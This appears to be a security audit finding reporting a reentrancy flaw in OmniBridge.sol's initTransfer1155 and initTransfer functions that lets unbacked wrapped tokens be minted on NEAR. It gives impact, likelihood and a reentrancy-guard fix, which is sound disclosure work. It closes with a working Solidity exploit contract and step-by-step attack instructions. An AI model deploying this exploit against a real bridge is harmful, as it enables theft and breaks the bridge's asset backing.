### Title
Reentrancy in `initTransfer1155` and `initTransfer` Allows Minting Unbacked Wrapped Assets on NEAR — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.sol` makes external calls to attacker-controlled token contracts inside `initTransfer1155` and `initTransfer` **before** emitting `InitTransfer` events and publishing cross-chain messages, with no reentrancy guard. A malicious ERC1155 (or ERC20) can reenter these functions during the external call, causing multiple `InitTransfer` events with distinct nonces to be emitted while locking zero tokens. The NEAR bridge processes each event independently via proof verification, minting wrapped assets for each, producing unbacked supply.

---

### Finding Description

`OmniBridge` inherits from `UUPSUpgradeable`, `AccessControlUpgradeable`, `SelectivePausableUpgradable`, and `IERC1155Receiver`. None of these provide a reentrancy guard, and no `nonReentrant` modifier is applied anywhere in the contract. [1](#0-0) 

**Primary vector — `initTransfer1155`:**

The function increments `currentOriginNonce` at line 448, then immediately makes an external call to the caller-supplied `tokenAddress` at line 458, before `initTransferExtension` (line 468) and the `InitTransfer` event (line 480): [2](#0-1) 

The call at line 458 is `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")`. `tokenAddress` is fully attacker-controlled — anyone can deploy an ERC1155 and call this function. A malicious ERC1155 can implement `safeTransferFrom` to reenter `initTransfer1155` before returning. Because `currentOriginNonce` was already incremented, the reentrant call receives nonce `N+1`, and the original call retains nonce `N`. Both calls then independently reach `initTransferExtension` and emit `InitTransfer`, producing two valid cross-chain messages with distinct nonces while the attacker locked zero tokens. [3](#0-2) 

**Secondary vector — `initTransfer` (non-bridge ERC20 branch):**

The same pattern exists in `initTransfer`. For tokens that are neither bridge tokens nor have a custom minter, the contract calls `IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount)` at line 407, before `initTransferExtension` (line 415) and the event (line 427). A malicious ERC20 can reenter here identically. [4](#0-3) 

**In the Wormhole deployment (`OmniBridgeWormhole`)**, `initTransferExtension` calls `_wormhole.publishMessage`, so each reentrant frame publishes a distinct Wormhole VAA: [5](#0-4) 

**On the NEAR side**, `fin_transfer_callback` verifies a proof of the EVM `InitTransfer` event and mints tokens. It checks that the emitter is a registered factory and that the token is known, but it does not deduplicate by `origin_nonce` at the point of proof acceptance. Since the two reentrant events carry **different** nonces (`N` and `N+1`), both proofs are independently valid and both will be processed: [6](#0-5) 

---

### Impact Explanation

An unprivileged attacker can mint an unbounded quantity of wrapped tokens on NEAR (or any destination chain) without locking any collateral on EVM. Each reentrant frame produces a unique nonce and a valid cross-chain proof. This directly breaks the 1:1 backing guarantee of the bridge, constituting unauthorized creation of wrapped bridge assets.

---

### Likelihood Explanation

The entry path requires only deploying a malicious ERC1155 (or ERC20) contract and calling `initTransfer1155` (or `initTransfer`) — both are public, permissionless functions. No privileged role, leaked key, or external dependency compromise is needed. The attack is deterministic and repeatable.

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, and `finTransfer`. Alternatively, restructure both `initTransfer*` functions to follow strict checks-effects-interactions order: perform all state changes and emit all events/messages **before** any external token call. The nonce increment already happens first, but the cross-chain message publication and event emission must also precede the external call.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Called by bridge: safeTransferFrom(attacker, bridge, tokenId, amount, "")
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter: emits InitTransfer with nonce N+1, locks 0 tokens
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount), 0, 0,
                "near:attacker.near", ""
            );
        }
        // Return without transferring — bridge holds 0 tokens
    }

    // Satisfy IERC1155 interface minimally
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}
```

**Steps:**
1. Deploy `MaliciousERC1155` pointing at the `OmniBridge` (or `OmniBridgeWormhole`) address.
2. Call `bridge.logMetadata1155(maliciousERC1155, tokenId)` to register the token.
3. Call `bridge.initTransfer1155(maliciousERC1155, tokenId, amount, 0, 0, "near:attacker.near", "")`.
4. During step 3, `safeTransferFrom` reenters, emitting `InitTransfer` with nonce `N+1` and publishing a Wormhole VAA — zero tokens locked.
5. Original call completes, emitting `InitTransfer` with nonce `N` and publishing a second VAA — zero tokens locked.
6. Submit both VAAs to the NEAR bridge via `fin_transfer`; both pass proof verification and mint wrapped tokens for the attacker.
